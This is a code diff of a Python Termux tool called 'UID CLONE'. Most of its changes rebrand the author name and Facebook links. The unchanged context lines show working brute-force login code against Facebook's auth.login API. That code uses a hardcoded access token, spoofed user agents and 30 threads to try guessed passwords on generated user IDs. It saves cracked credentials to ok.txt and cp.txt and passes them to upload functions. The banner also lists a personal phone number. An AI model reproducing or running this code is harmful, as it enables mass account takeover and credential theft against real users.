@@ -44,8 +44,8 @@ def runtxt(z):
 
 def helpnote():
 	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
-	subprocess.check_output(["am", "start", "https://www.facebook.com/Cyber.Army0033"])
-	exit(" [*] FACEBOOK :  https://www.facebook.com/Cyber.Army0033")
+	subprocess.check_output(["am", "start", "https://facebook.com/groups/647002200235764/"])
+	exit(" [*] FACEBOOK :  https://facebook.com/groups/647002200235764/")
 
 
 def notice():
@@ -54,8 +54,8 @@ def notice():
 
 	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
 	runtxt("\033[0;93m SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
-	runtxt("\033[0;92m ADMIN FACEBOOK >> CYBER ARMY")
-	subprocess.check_output(["am", "start", "https://www.facebook.com/Cyber.Army0033"])
+	runtxt("\033[0;92m ADMIN FACEBOOK GROUP >> TERMUX GROUP")
+	subprocess.check_output(["am", "start", "https://facebook.com/groups/647002200235764/"])
 
 
         
@@ -105,13 +105,13 @@ class Main:
 🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸🔸
 \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
      \033[1;92m➣ \033[1;92mDEVOLPER   :            B-HACKER 2.0
-     \033[1;91m➣ \033[1;92mFACEBOOK   :  HRIDOY CHOWDURY RAIHAN
+     \033[1;91m➣ \033[1;92mFACEBOOK   :            HRIDOY CHOWDURY RAIHAN
      \033[1;93m➣ \033[1;92mWHATSAPP   :            01787720693
      \033[1;96m➣ \033[1;92mGITHUB     :            RAIHAN-404
      \033[1;95m➣ \033[1;92mTOOLS      :            FACEBOOK ID CLONE
 \033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     """)
-		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLON"%(G,R,G,Y,G))
+		print("%s [%sâ€¢%s] %sTOOL NAME : %sUID CLONE"%(G,R,G,Y,G))
 		print("%s [%sâ€¢%s] %sVERSION   : %s1.0"%(G,R,G,Y,G))
 		print("%s [%sâ€¢%s] %sYOUR KEY  : %s%s"%(G,R,G,Y,G,key))
 		print("%s [%sâ€¢%s] %sSTATUS    : %s"%(G,R,G,Y,stat)) 
@@ -236,7 +236,7 @@ class Main:
 				self.id.append(__+str(_))
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR CYBER ARMY  "%(Y,G,B,Y))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR RAIHAN ARMY  "%(Y,G,B,Y))
 				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
 				if len(listpass)<=5:
@@ -266,7 +266,7 @@ class Main:
 				self.id.append(__+str(_))
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR CYBER ARMY "%(Y,G,B,Y))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR RAIHAN ARMY "%(Y,G,B,Y))
 				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
 				if len(listpass)<=5:
@@ -329,7 +329,7 @@ class Main:
 				self.id.append(___+str(_)+__)
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR CYBER ARMY "%(Y,G,B,Y))
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR RAIHAN ARMY "%(Y,G,B,Y))
 				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
 				listpass = input(" [?] ENTER PASSWORD : ")
 				if len(listpass)<=5:
@@ -379,7 +379,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r\r %s\033[0;93m [CYBER] : \033[0;97m %s/%s -> \033[0;92m [CYBER -OK:%s ]- \033[0;93m[CYBER-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s\033[0;93m [RAIHAN] : \033[0;97m %s/%s -> \033[0;92m [RAIHAN -OK:%s ]- \033[0;93m[RAIHAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -396,15 +396,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[CYBER-OK] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[RAIHAN-OK] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [CYBER-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [RAIHAN-OK] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[CYBER-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[RAIHAN-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [CYBER-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [RAIHAN-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
